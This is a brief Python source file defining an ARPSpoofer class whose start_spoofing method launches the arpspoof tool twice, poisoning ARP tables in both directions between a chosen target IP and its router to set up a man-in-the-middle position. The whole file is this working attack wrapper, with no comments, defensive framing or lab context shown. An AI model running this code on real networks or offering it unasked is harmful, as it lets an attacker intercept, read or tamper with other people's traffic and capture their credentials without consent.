import subprocess

class ARPSpoofer:
    def __init__(self, target_ip, router_ip, interface="eth0"):
        self.target_ip = target_ip
        self.router_ip = router_ip
        self.interface = interface

    def start_spoofing(self):
        subprocess.Popen(["arpspoof", "-i", self.interface, "-t", self.target_ip, self.router_ip])
        subprocess.Popen(["arpspoof", "-i", self.interface, "-t", self.router_ip, self.target_ip])
